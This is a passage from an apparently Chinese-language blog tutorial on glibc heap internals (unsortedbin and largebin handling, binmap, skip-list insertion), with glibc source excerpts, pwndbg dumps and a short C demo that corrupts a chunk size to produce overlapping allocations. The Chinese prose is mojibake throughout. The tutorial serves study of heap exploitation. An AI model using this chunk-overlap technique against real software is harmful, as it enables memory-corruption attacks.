class="comment">//å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);        <span class="comment">//å‘ååˆå¹¶</span></span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">      not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">      been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);      <span class="comment">//æŒ‚åˆ°unsortedbinä¸Š</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.åœ¨mallocæ—¶,å¦‚æœä»<code>unsorted</code>ä¸­åˆ‡å‰²äº†ä¸€ä¸ªå¤§å—æ»¡è¶³ä¸€ä¸ªå°å—çš„åˆ†é…è¯·æ±‚,é‚£ä¹ˆå‰©ä½™å—ä¼šè¢«é‡æ–°æŒ‚åˆ°<code>unsortedbin</code>ä¸­</p>
<h5 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h5><p>å¦‚æœä¸€ä¸ªå †å—è¢«<code>free</code>ä¹‹å,æ—¢æ²¡æœ‰è¢«<code>tcache</code>,<code>fastbins</code>ç•™ä½,ä¹Ÿä¸æ˜¯<code>mmap</code>æ˜ å°„å—,é‚£ä¹ˆæ­¤æ—¶è¯¥å †å—å¯èƒ½æœ‰ä¸¤ç§å½’å®¿:</p>
<p>1.ç‰©ç†ä¸Šä¸<code>topchunk</code>ç›¸é‚»,åˆå¹¶åˆ°<code>topchunk</code></p>
<p>2.ä¸ä¸<code>topchunk</code>ç›¸é‚»,æŒ‚åˆ°<code>unsortedbin</code>ä¸Š</p>
<p>[ä¸å¤ªå¯èƒ½å‘ç”Ÿçš„]å¦‚æœè¯¥å †å—è¿‡å¤§,è¶…è¿‡<code>fastbins</code>åˆå¹¶é˜ˆå€¼(64K),ä¼šè§¦å‘å †å†…å­˜ç¼©å‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))			<span class="comment">//émmapæ˜ å°„åŒº</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">// å°è¯•å‘å‰åˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) <span class="comment">// å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">        bck = unsorted_chunks(av); <span class="comment">// æŒ‚åˆ°unsortedbinä¸Š</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">		...</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">		...</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// åˆå¹¶åˆ°topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h5 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h5><p>å½“<code>tcache</code>,<code>fastbins</code>,<code>smallbins</code>éƒ½æ²¡æœ‰æ»¡è¶³ä¸€æ¬¡åˆ†é…è¯·æ±‚,å¯èƒ½æ˜¯è¯·æ±‚å¤§å°å¤ªå¤§,æˆ–è€…å“¥ä»¨ç©·çš„å®å½“å“,åæ­£å°±æ˜¯æ²¡æ»¡è¶³</p>
<p>ä¸ºäº†åˆ©ç”¨å±€éƒ¨æ€§åŸåˆ™,<code>unsortedbin</code>ä¸­æœ‰ä¸€ä¸ªæŒ‡é’ˆ<code>last_remainder</code>,ä¹Ÿå°±æ˜¯æœ€åä¸€æ¬¡åˆ‡å‰²<code>unsortedbin</code>ä¸­å †å—åå‰©ä¸‹çš„éƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">å¤–åœˆå¾ªç¯</span><br><span class="line">	å†…åœˆå¾ªç¯éå†unsortedbin,å¯¹äºæ¯ä¸ªunsortedä¸­çš„å †å—:</span><br><span class="line">		å¦‚æœæ˜¯unsortedä¸­çš„å”¯ä¸€å †å—,å¹¶ä¸”è¯¥å—æ˜¯last_remainderå¹¶ä¸”è¿™å—è¶³å¤Ÿç›¸åº”è¯·æ±‚ åˆ™:</span><br><span class="line">			ç»§ç»­åˆ‡å®ƒ,*è¿”å›*éœ€è¦çš„,ç•™ä¸‹å¤šä½™çš„</span><br><span class="line">		å¦åˆ™å¯èƒ½æœ‰å¦‚ä¸‹æƒ…å†µ:<span class="number">1.</span>è¿™å—ä¸æ˜¯unsortedä¸­çš„å”¯ä¸€å— <span class="number">2.</span>ä¸æ˜¯last_remainder <span class="number">3.</span>ä¸å¤Ÿå¤§   æ­¤æ—¶åº”:</span><br><span class="line">			æŠŠå®ƒä»unsortedbinä¸Šæ‹†ä¸‹æ¥,ç„¶å:</span><br><span class="line">			å¦‚æœå¤§å°æ­£å¥½æ»¡è¶³è¯·æ±‚</span><br><span class="line">				å¦‚æœtcacheæœªæ»¡,åˆ™æ”¾åˆ°tcacheä¸­</span><br><span class="line">				å¦‚æœtcacheæ»¡äº†,æˆ–è€…æœªå¯ç”¨tcache,åˆ™ç›´æ¥*è¿”å›*</span><br><span class="line">			å¦åˆ™å¦‚æœå¤§å°åœ¨smallbinsèŒƒå›´å†…,åˆ™æ”¾åˆ°smallbinsä¸­</span><br><span class="line">			å¦åˆ™å¤§å°åœ¨largebinsèŒƒå›´å†…,åˆ™æ”¾åˆ°largebinsä¸­</span><br><span class="line">			å¦‚æœè¢«æ”¾åˆ°äº†tcacheä¸­,æ­¤æ—¶ä»tcacheä¸­æ‹¿ä¸€ä¸ª*è¿”å›*</span><br><span class="line">    å†…åœˆå¾ªç¯ç»“æŸ</span><br><span class="line">                </span><br><span class="line">	å¦‚æœç”³è¯·å¤§å°åœ¨largebinsèŒƒå›´,åˆ™å°è¯•ä½¿ç”¨largebinåˆ†é…</span><br><span class="line">	å¦‚æœåˆšæ‰çš„largebinæ²¡æœ‰æ»¡è¶³è¯·æ±‚,åˆ™éå†æ›´å¤§å·çš„largebinä¸­æ‰¾</span><br><span class="line">	å¦‚æœè¿˜æ²¡æ»¡è¶³,ä½¿ç”¨topchunkåˆ†é…</span><br><span class="line">	å¦‚æœè¿˜æ²¡æ»¡è¶³,ä½¿ç”¨sysmallocåˆ†é…</span><br><span class="line">                </span><br><span class="line">å¤–åœˆå¾ªç¯ç»“æŸ</span><br></pre></td></tr></table></figure>

<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><h5 id="overlap"><a href="#overlap" class="headerlink" title="overlap"></a>overlap</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *p1;</span><br><span class="line">    <span class="type">size_t</span> *p2;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">// usable(0x400) + header(0x10)</span></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);  <span class="comment">// usable(0x40) + header(0x10)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *p1_size = (<span class="type">char</span>*)p1 - <span class="number">0x8</span>;      </span><br><span class="line">    *p1_size = <span class="number">0x461</span>;       <span class="comment">//suppose off by one ... </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);			<span class="comment">//in unsortedbin</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc overlap.c -o overlap -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./overlap</span><br><span class="line">p1: 0x5600128e52a0</span><br><span class="line">p1: 0x5600128e52a0</span><br></pre></td></tr></table></figure>



<h3 id="å¤§æ–ŒLargebins"><a href="#å¤§æ–ŒLargebins" class="headerlink" title="å¤§æ–ŒLargebins"></a>å¤§æ–ŒLargebins</h3><p><code>bin_at(M,64~126) =&gt; large bins</code>è¿™ä¸ªèŒƒå›´æ˜¯largetbin,ä¸€å…±æœ‰63ä¸ªbin</p>
<p>binå†…å †å—å¤§å°ç›¸ç­‰</p>
<p>binä¹‹é—´åˆ†äº†6ç»„,ç»„å†…å„ä¸ªbinå †å—å¤§å°æˆç­‰å·®æ•°åˆ—</p>
<table>
<thead>
<tr>
<th>ç»„</th>
<th>ä¸ªæ•°</th>
<th>å…¬å·®</th>
</tr>
</thead>
<tbody><tr>
<td>bin_at(M,64~95)</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>bin_at(M,96~111)</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>bin_at(M,112~119)</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>bin_at(M,120~123)</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>bin_at(M,124~125)</td>
<td>2</td>
<td>â€¦</td>
</tr>
<tr>
<td>bin_at(M,126)</td>
<td>1</td>
<td>â€¦</td>
</tr>
</tbody></table>
<h4 id="datastructure-2"><a href="#datastructure-2" class="headerlink" title="datastructure"></a>datastructure</h4><p>å‡è®¾<code>largebins</code>çš„<code>bin_at(M,63)</code>ç›®å‰çš„çŠ¶æ€å¦‚ä¸‹:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x55555555dba0 â€”â–¸ 0x55555555dfe0 â€”â–¸ 0x55555555d340 â€”â–¸ 0x55555555d770 â€”â–¸ 0x55555555cb00 â€”â–¸ 0x55555555cf20 â€”â–¸ 0x7ffff7fa70d0 (main_arena+1104) â—‚â€” 0x55555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dba0</span><br><span class="line">0x55555555dba0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dbb0: 0x000055555555dfe0      0x00007ffff7fa70d0</span><br><span class="line">0x55555555dbc0: 0x000055555555d340      0x000055555555cb00</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dfe0</span><br><span class="line">0x55555555dfe0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dff0: 0x000055555555d340      0x000055555555dba0</span><br><span class="line">0x55555555e000: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d340</span><br><span class="line">0x55555555d340: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d350: 0x000055555555d770      0x000055555555dfe0</span><br><span class="line">0x55555555d360: 0x000055555555cb00      0x000055555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d770</span><br><span class="line">0x55555555d770: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d780: 0x000055555555cb00      0x000055555555d340</span><br><span class="line">0x55555555d790: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cb00</span><br><span class="line">0x55555555cb00: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cb10: 0x000055555555cf20      0x000055555555d770</span><br><span class="line">0x55555555cb20: 0x000055555555dba0      0x000055555555d340</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cf20</span><br><span class="line">0x55555555cf20: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cf30: 0x00007ffff7fa70d0      0x000055555555cb00</span><br><span class="line">0x55555555cf40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/2gx 0x7ffff7fa70d0+0x10</span><br><span class="line">0x7ffff7fa70e0 &lt;main_arena+1120&gt;:       0x000055555555dba0      0x000055555555cf20</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç”»åˆ°å›¾ä¸Šé•¿è¿™é€¼æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030144119554.png" alt="image-20241030144119554"></p>
<table>
<thead>
<tr>
<th>çº¿æ¡é¢œè‰²</th>
<th>æŒ‡é’ˆ</th>
</tr>
</thead>
<tbody><tr>
<td>è“</td>
<td>fd</td>
</tr>
<tr>
<td>ç»¿</td>
<td>bk</td>
</tr>
<tr>
<td>ç²‰</td>
<td>fd_nextsize</td>
</tr>
<tr>
<td>é»„</td>
<td>bk_nextsize</td>
</tr>
</tbody></table>
<p><strong>å®é™…ä¸Šlargebinå¯ä»¥çœ‹ä½œåŒå‘é“¾è¡¨, åˆåŠ ä¸Šäº†è·³è¡¨ç´¢å¼•</strong></p>
<h5 id="åŒå‘é“¾è¡¨"><a href="#åŒå‘é“¾è¡¨" class="headerlink" title="åŒå‘é“¾è¡¨"></a>åŒå‘é“¾è¡¨</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145225118.png" alt="åŒå‘é“¾è¡¨"></p>
<h5 id="è·³è¡¨ç´¢å¼•"><a href="#è·³è¡¨ç´¢å¼•" class="headerlink" title="è·³è¡¨ç´¢å¼•"></a>è·³è¡¨ç´¢å¼•</h5><p>é™„åŠ å¤´èŠ‚ç‚¹<code>bin_at(M,idx)</code>åªæœ‰<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆ,æ²¡æœ‰<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>è·³è¡¨ç´¢å¼•</p>
<p>æ‰€æœ‰å †å—é¦–å…ˆæŒ‰ç…§å¤§å°é™åºæ’åˆ—æˆåŒå‘é“¾è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x421]-&gt;[0x421]-&gt;[0x411]-&gt;[0x411]-&gt;[0x401]-&gt;[0x401]</span><br></pre></td></tr></table></figure>

<p>åªåœ¨ç›¸åŒå¤§å°çš„å †å—ç°‡çš„<strong>é¦–ä¸ªå †å—</strong>ä¸Šå»ºç«‹<strong>è·³è¡¨ç´¢å¼•</strong>,æŒ‡å‘<strong>ä¸‹ä¸€ä¸ªå¤§å°ä¸åŒçš„å †å—ç°‡</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145332777.png" alt="è·³è¡¨ç´¢å¼•"></p>
<h5 id="é“¾è¡¨-è·³è¡¨"><a href="#é“¾è¡¨-è·³è¡¨" class="headerlink" title="é“¾è¡¨+è·³è¡¨"></a>é“¾è¡¨+è·³è¡¨</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030150204350.png" alt="image-20241030150204350"></p>
<h5 id="binmap"><a href="#binmap" class="headerlink" title="binmap"></a>binmap</h5><p><code>binmap</code>ç”¨äºåœ¨<code>largebin</code>çš„ä¸­åŠ é€ŸæŸ¥æ‰¾æ›´å¤§çš„éç©ºçš„<code>bin</code> </p>
<p><code>binmap</code> æ˜¯<code>malloc_state</code>çš„æˆå‘˜,<code>4</code>ä¸ª<code>int</code>,å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ª<code>128</code>ä½çš„ä½å‘é‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"><span class="comment">//unsigned int binmap[4];</span></span><br></pre></td></tr></table></figure>





<p><code>i</code> å°±æ˜¯æ ¹æ®å †å—å¤§å°è½åˆ°çš„<code>largebin</code>ä¸‹æ ‡<code>idx</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))		<span class="comment">//æ ‡è®°ä¸‹æ ‡ä¸ºiçš„æ¡¶å­ä¸­æœ‰è‡³å°‘ä¸€ä¸ªå †å—</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))	<span class="comment">//æ ‡è®°ä¸‹æ ‡ä¸ºiçš„æ¡¶å­ä¸­ä¸€ä¸ªå †å—ä¹Ÿæ²¡æœ‰</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))		<span class="comment">//æŸ¥çœ‹ä¸‹æ ‡ä¸ºiçš„æ¡¶å­ä¸­æœ‰æ²¡æœ‰å †å—</span></span></span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mark_bin(m,63) </span><br><span class="line">	binmap[63&gt;&gt;5] |= ((1U &lt;&lt; ((63) &amp; ((1U &lt;&lt; 5) - 1))))</span><br><span class="line">	binmap[1] |= (1&lt;&lt;31)</span><br><span class="line">	</span><br><span class="line">mark_bin(m,64)</span><br><span class="line">	binmap[2] |= (1&lt;&lt;0)</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯å¯¹äº<code>largebin</code>æ¥è¯´,<code>binmap[0]</code>æ°¸è¿œç”¨ä¸åˆ°</p>
<h4 id="algorithm-4"><a href="#algorithm-4" class="headerlink" title="algorithm"></a>algorithm</h4><p><code>largebin</code>ä¸­çš„å †å—,åªèƒ½æ˜¯æ¥è‡ªäº<code>unsortedbin</code></p>
<p>å¦‚æœæŸæ¬¡<code>malloc</code>æ²¡æœ‰ä»<code>tcache,fastbins,smallbins</code>,ä¸­å¾—åˆ°æƒ³è¦çš„å †å—</p>
<p>æ­¤æ—¶éœ€è¦éå†<code>unsortedbin</code>,æ•´ç†å…¶ä¸­çš„æ‰€æœ‰å †å—,å½’ç±»åˆ°<code>smallbins</code>æˆ–è€…<code>largebins</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unsortedbinæ•´ç†ç®—æ³•:</span></span><br><span class="line"></span><br><span class="line">å¦‚æœunsortedbinåªæœ‰last_remainderå¹¶ä¸”ä»–èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚</span><br><span class="line">	é‚£ä¹ˆä»last_remainderå¤´éƒ¨åˆ‡å‡ºéœ€æ±‚,å‰©ä¸‹çš„ç»§ç»­ä½œä¸ºlast_remainder,ç„¶åè¿”å›</span><br><span class="line"></span><br><span class="line">å¦åˆ™ å°†unsortedä¸Šçš„è¿™å—å…ˆæ‹¿ä¸‹æ¥</span><br><span class="line">	å¦‚æœè¿™å—çš„å¤§å°æ­£å¥½ç­‰äºéœ€æ±‚</span><br><span class="line">		å¦‚æœtcacheä¸æ»¡åˆ™å…ˆæ¬åˆ°tcacheå¹¶è®°ä¸‹tcacheå¯ä»¥æ»¡è¶³,<span class="keyword">continue</span>, åœ¨æ•´ç†å®Œæ‰€æœ‰unsortedbinä¹‹åå†è¿”å›, æ•´ç†è¿‡ç¨‹ä¸­å¦‚æœtcacheæ»¡äº†ä¹Ÿä¼šè¿”å›</span><br><span class="line">		å¦åˆ™tcacheæ»¡åˆ™ç›´æ¥è¿”å›</span><br><span class="line">	å¦åˆ™</span><br><span class="line">		å¦‚æœè¿™å—åœ¨smallbinèŒƒå›´å†…å°±æ”¾åˆ°smallbin</span><br><span class="line">		å¦åˆ™è¿™å—åœ¨largebinèŒƒå›´å†…å°±æ”¾åˆ°largebin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°†<code>unsortedbin</code>å †å—æ”¾åˆ°<code>smallbins</code>ä¸­æ—¶éå¸¸ç®€å•,å› ä¸º<code>smallbins</code>ä¸­çš„å †å—å¤§å°å’Œæ¡¶å­ä¸‹æ ‡æœ‰ä¸¥æ ¼çš„å…³ç³»,æ ¹æ®å †å—å¤§å°è®¡ç®—å‡ºä¸‹æ ‡,å¤´æ’æ³•ä¸€å¡å°±å®Œäº†</p>
<p><strong>ä½†æ˜¯å¾€<code>largebin</code>æ”¾æ—¶,ä¸€ä¸ª<code>bin</code>é‡Œé¢å¯èƒ½ä¼šæœ‰ä¸åŒå¤§å°çš„å †å—,éœ€è¦å…ˆé€šè¿‡è·³è¡¨ç´¢å¼•è¿›è¡Œæ’å…¥æ’åº</strong></p>
<h5 id="æ’å…¥æ›´å°çš„å †å—"><a href="#æ’å…¥æ›´å°çš„å †å—" class="headerlink" title="æ’å…¥æ›´å°çš„å †å—"></a>æ’å…¥æ›´å°çš„å †å—</h5><p>å‡è®¾ç°åœ¨<code>bin_at(M,63)</code>ä¸­å·²ç»æœ‰<code>0x421,0x411</code>çš„è·³è¡¨ç´¢å¼•</p>
<p>åˆè¦å°†ä¸€ä¸ª<code>0x401</code>çš„å †å—æ”¾è¿›å»</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101203700160.png" alt="image-20241101203700160"></p>
<h5 id="æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—"><a href="#æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—" class="headerlink" title="æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—"></a>æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—</h5><p>å‡è®¾ç°åœ¨<code>bin_at(M,63)</code>ä¸­å·²ç»æœ‰<code>0x421,0x411,0x401</code>çš„è·³è¡¨ç´¢å¼•</p>
<p>åˆè¦å°†ä¸€ä¸ª<code>0x411</code>çš„å †å—æ”¾è¿›å»,é‚£ä¹ˆè¿‡ç¨‹å°†ä¼šæ˜¯è¿™æ ·çš„:</p>
<p>0.è®¡ç®—å¾—çŸ¥<code>0x411</code>è½åœ¨<code>bin_at(M,63)</code>èŒƒå›´</p>
<p>1.ä¸<code>bin_at(M,63)-&gt;bk</code>,ä¹Ÿå°±æ˜¯è¿™ä¸ª<code>bin</code>é‡Œæœ€å°çš„å †å—,ä¹Ÿå°±æ˜¯ä¸€ä¸ª<code>0x401</code>çš„å †å—è¿›è¡Œæ¯”è¾ƒ,å‘ç°æ–°æ”¾å…¥çš„å †å—<strong>ä¸æ˜¯æœ€å°çš„</strong>,ä¸èƒ½ç›´æ¥æ”¾åˆ°<code>bin_at(M,63)-&gt;bk</code>ä¸Š,éœ€è¦ä»å¤§åˆ°å°éå†è¿™ä¸ª<code>bin</code>,è¿›è¡Œ<strong>æ’å…¥æ’åº</strong></p>
<p>2.ä»<code>bin_at(M,63)-&gt;fd</code>,æœ‰å°±æ˜¯è¿™ä¸ª<code>bin</code>é‡Œæœ€å¤§çš„å †å—,ä¹Ÿå°±æ˜¯ä¸<code>0x421</code>å¼€å§‹æ¯”è¾ƒ,å‘ç°æ–°æ”¾å…¥çš„å †å—æ¯”ä»–å°</p>
<p>3.åˆ©ç”¨<code>0x421</code> ä¸Šçš„è·³è¡¨ç´¢å¼•,æ‰¾åˆ°äº†<code>0x411</code>çš„,æ–°å †å—å¯ä»¥æ”¾åˆ°è¿™é‡Œäº†</p>
<p>4.ä¿æŒè·³è¡¨ç´¢å¼•å †å—ä¸å˜,åœ¨å…¶<code>fd</code>ä¸Šæ’å…¥æ–°å †å—</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030153014682.png" alt="image-20241030153014682"></p>
<h5 id="æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—"><a href="#æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—" class="headerlink" title="æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—"></a>æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—</h5><p>å‡è®¾ç°åœ¨<code>bin_at(M,63)</code>ä¸­å·²ç»æœ‰<code>0x421,0x401</code>çš„è·³è¡¨ç´¢å¼•</p>
